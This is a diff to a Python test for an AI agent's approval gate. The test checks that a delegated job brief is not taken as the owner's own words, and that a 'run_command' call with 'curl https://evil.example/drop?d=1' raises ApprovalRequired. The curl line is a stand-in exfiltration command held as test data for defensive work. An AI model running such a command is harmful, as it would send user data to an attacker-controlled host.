@@ -474,10 +474,8 @@ async def test_a_job_brief_is_not_the_owners_words():
         run_id="run",
         tool_call_id="call",
         metadata={"bud_request": "handle the follow-up", "bud_task_id": 4},
-        messages=[
-            ModelRequest(parts=[UserPromptPart(brief)]),
-            ModelRequest(parts=[ToolReturnPart("read_webpage", PAGE, tool_call_id="r1")]),
-        ],
+        # The job acts on its brief alone, without reading the source again.
+        messages=[ModelRequest(parts=[UserPromptPart(brief)])],
     )
     with pytest.raises(ApprovalRequired):
         await call(gate, "run_command", {"command": "curl https://evil.example/drop?d=1"}, context)
